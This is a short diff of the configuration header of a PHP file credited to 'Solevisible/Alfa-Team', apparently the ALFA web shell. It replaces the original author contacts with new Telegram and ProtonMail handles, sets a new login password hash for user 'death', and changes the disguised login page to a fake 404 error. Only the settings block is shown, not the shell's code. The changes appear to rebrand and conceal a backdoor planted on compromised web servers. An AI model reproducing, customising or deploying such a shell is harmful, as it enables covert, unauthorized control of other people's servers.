@@ -1,16 +1,16 @@
 <?php
 /*
 	Author: 	Solevisible/Alfa-Team
-	Telegram: 	https://telegram.me/solevisible
-	YouTube: 	https://youtube.com/solevisible
-	Gmail:		solevisible@gmail.com
-	Date:		Monday, September 14, 2020
+	Telegram: 	https://t.me/keccy
+	Channel: 	https://t.me/deathbase
+	Gmail:		ryphon@proton.me
+	Date:		Monday, May 10, 2025
 */
 $GLOBALS['oZgNypoPRU'] = array(
     'username' => 'death',
-    'password' => '2e8d6dbf9112a879d4ceb15403d10a78',
+    'password' => '64592e315b7537d1dc34a9f1104c05fb',
     'safe_mode' => '1',
-    'login_page' => '500',
+    'login_page' => '404',
     'show_icons' => '1',
     'post_encryption' => false,
     'cgi_api' => true,
